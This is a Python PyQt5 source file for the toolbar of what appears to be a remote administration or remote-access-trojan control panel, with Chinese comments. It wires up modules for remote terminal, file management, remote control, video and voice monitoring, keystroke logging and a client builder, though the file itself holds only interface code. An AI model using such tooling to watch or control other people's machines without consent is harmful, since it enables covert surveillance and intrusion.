# -*- coding: utf-8 -*-
from PyQt5.QtCore import QSize, Qt, QCoreApplication
from PyQt5.QtGui import QHideEvent
from PyQt5.QtWidgets import QToolBar, QMainWindow

from bin.ui_view.utils import load_animation
from bin.ui_view.utils.exit import ExitUI
from bin.ui_view.utils.fileManage import FileManagerUI
from bin.ui_view.utils.keyboard import KeyboardUI
from bin.ui_view.utils.make_client import MakeClientUI
from bin.ui_view.utils.remote_control import RemoteControlUI
from bin.ui_view.utils.server_manager import ServiceManagerUI
from bin.ui_view.utils.server_start import ServerStartUI
from bin.ui_view.utils.terminal import TerminalUI
from bin.ui_view.utils.videomonitor import VideoMonitorUI
from bin.ui_view.utils.voice_montor import VoiceMonitorUI
from lib import settings
from lib.communicate import communicate

_translate = QCoreApplication.translate

"""
工具导航
"""


class ToolbarUI(object):
    def __init__(self, main_window: QMainWindow):
        """
        工具导航
        外观模式
        :param main_window:
        """
        self.main_window = main_window
        self.toolbar = QToolBar(self.main_window)

        # 子类
        self.ui_list = []
        self.server_start_ui = ServerStartUI(self.toolbar)  # 服务器开关
        self.file_manager_ui = FileManagerUI(self.toolbar)  # 文件管理
        self.terminal_ui = TerminalUI(self.toolbar)  # 远程终端
        self.remote_control_ui = RemoteControlUI(self.toolbar)  # 远程控制
        self.video_monitor_ui = VideoMonitorUI(self.toolbar)  # 视频监控
        self.voice_monitor_ui = VoiceMonitorUI(self.toolbar)  # 语音监控
        self.keyboard_ui = KeyboardUI(self.toolbar)  # 键盘记录
        self.make_client_ui = MakeClientUI(self.toolbar)  # 创建客户端
        self.service_manager_ui = ServiceManagerUI(self.toolbar)  # 服务管理
        self.exit_ui = ExitUI(self.toolbar, self.main_window)  # 退出程序

    def options(self) -> None:
        """
        参数设置
        :return:
        """
        self.toolbar.setObjectName("toolBar")

        # 设置是否可以移动
        self.toolbar.setMovable(True)

        # 设置是否可以悬浮在主窗口
        self.toolbar.setFloatable(True)

        # 设置图标尺寸
        self.toolbar.setIconSize(QSize(25, 25))

        # 字体在右边
        # self.tools_main.setToolButtonStyle(Qt.ToolButtonTextBesideIcon)

        # 字体在下面
        if settings.LOAD_EFFECT_ON:
            self.toolbar.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)
            load_animation.load_animation(self.toolbar)

        # 窗口添加工具导航栏
        self.main_window.addToolBar(Qt.TopToolBarArea, self.toolbar)

    def setup_ui(self) -> None:
        self.options()

        if not settings.TOOLBAR_SHOW:
            self.toolbar.hide()

        self.load_ui()
        self.show_ui()

        # QDockWidget 位置发生变动
        self.toolbar.orientationChanged.connect(self.orientation_changed)

    def orientation_changed(self, event) -> None:
        """
        位置变动事件
        :param event:
        :return:
        """
        if event:
            pass
        if settings.LOAD_EFFECT_ON:
            load_animation.load_animation(self.toolbar)

    # noinspection PyArgumentList
    def retranslate_ui(self) -> None:
        self.toolbar.setWindowTitle(_translate("ToolbarUI", "工具导航"))

    def load_ui(self) -> None:
        """
        加载模块
        :return:
        """
        self.ui_list.append(self.server_start_ui)
        self.ui_list.append(self.file_manager_ui)
        self.ui_list.append(self.terminal_ui)
        self.ui_list.append(self.remote_control_ui)
        self.ui_list.append(self.video_monitor_ui)
        self.ui_list.append(self.voice_monitor_ui)
        self.ui_list.append(self.keyboard_ui)
        self.ui_list.append(self.make_client_ui)
        self.ui_list.append(self.service_manager_ui)
        self.ui_list.append(self.exit_ui)

    def show_ui(self) -> None:
        """
        显示数据
        :return:
        """
        for view in self.ui_list:
            view.setup_ui()
            view.retranslate_ui()


class ToolbarConnect(object):
    def __init__(self, toolbar_ui: ToolbarUI):
        """
        工具导航 信号
        :param toolbar_ui:
        """
        self.toolbar_ui = toolbar_ui

    def setup_ui(self) -> None:
        self.communicate_connect()
        self.toolbar_ui.toolbar.hideEvent = self.hide_event
        self.toolbar_ui.toolbar.showEvent = self.hide_event

    def communicate_connect(self) -> None:
        # 工具导航栏是否显示
        communicate.toolbar_show.connect(self.toolbar_show)

    def toolbar_show(self, flag: bool) -> None:
        if flag:
            # 显示
            self.toolbar_ui.toolbar.setHidden(False)
        else:
            # 隐藏
            self.toolbar_ui.toolbar.setHidden(True)

    def hide_event(self, event: QHideEvent) -> None:
        """
        菜单栏中的  工具导航
        :param event:
        :return:
        """
        if event:
            pass
        if self.toolbar_ui.toolbar.isHidden():
            communicate.toolbar_checked.emit(False)
        else:
            communicate.toolbar_checked.emit(True)

    def retranslate_ui(self) -> None:
        pass
